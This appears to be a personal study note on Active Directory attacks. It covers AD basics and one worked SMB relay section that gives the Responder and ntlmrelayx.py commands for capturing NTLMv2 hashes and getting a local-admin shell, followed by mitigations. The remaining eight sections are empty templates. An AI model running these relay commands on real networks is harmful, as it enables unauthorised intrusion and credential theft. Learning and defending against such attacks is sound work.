# Active Directory attacks
## AD_overvire

>Active Directory (AD) is a Microsoft product that consists of several services that run on Windows Server to manage permissions and access to networked resources. Active Directory stores data as objects. An object is a single element, such as a user, group, application or device, such as a printer.

[logo]: img/active.png
![alt text](img/active.png "active direcorty")

* ayad.tshoot.com called `FQDN` fully qualified domain name

* hostname      vs      netbios name

```console
both of them is a way to identifi machines inside my network
have dots             dots not allowd
modern                old
tshoot.com            TSHOOT
```

* important files

```console

C:\windows\NTDS    → users and groups database 
                   → ntds.dit is the file contains users and groups
C:\windows\NTDS    → logs
C:\windows\SYSVOL  → groups policy

```

* local admin or doamin admin is only who can put out computer from domain
* password can't be changed before passing 24-hour and maximum duration is 42-day
* user can't use the same pass before using 24 different pass
* some users leave their passwords in the description

* name resolution methods
[logo]: img/name.png
![alt text](img/name.png "name resolution")

* remote managent methods
[logo]: img/remote.png
![alt text](img/remote.png "remote resolution")

## smbrelay attack
### attack vector
  smb signing enable but not require
  pssed `NTLMv2` must be at least local admin
### tools
respnder
ntlmrelayx.py from impacket lib
### reproduce
responder -I eth0 -rwdv `disable smb and http from /etc/respnder/Responder.conf`
python /usr/share/doc/python-impacket/examples/ntlmrelayx.py -tf target.txt -smb2support  -i
>-tf         target file
-smb2support force ntlmrelay to use smbv2
-i           get interactive shell
-e           payload to run after exploit
-c           command

[logo]: img/responder.png
![alt text](img/responder.png "hashes dumped")
### payoff
we get rce as local administartor
we get local user `NTLMv2` hashes
### metigation
Enable smb siging on all devices
Disable NTLM auth and move to kerberos
Account tiering
local admin restriction
---
## smbrelay attack
### idea
### tools
### reproduce
### metigation

---
## smbrelay attack
### idea
### tools
### reproduce
### metigation

---
## smbrelay attack
### idea
### tools
### reproduce
### metigation

---
## smbrelay attack
### idea
### tools
### reproduce
### metigation

---
## smbrelay attack
### idea
### tools
### reproduce
### metigation

---
## smbrelay attack
### idea
### tools
### reproduce
### metigation

---
## smbrelay attack
### idea
### tools
### reproduce
### metigation

---
## smbrelay attack
### idea
### tools
### reproduce
### metigation









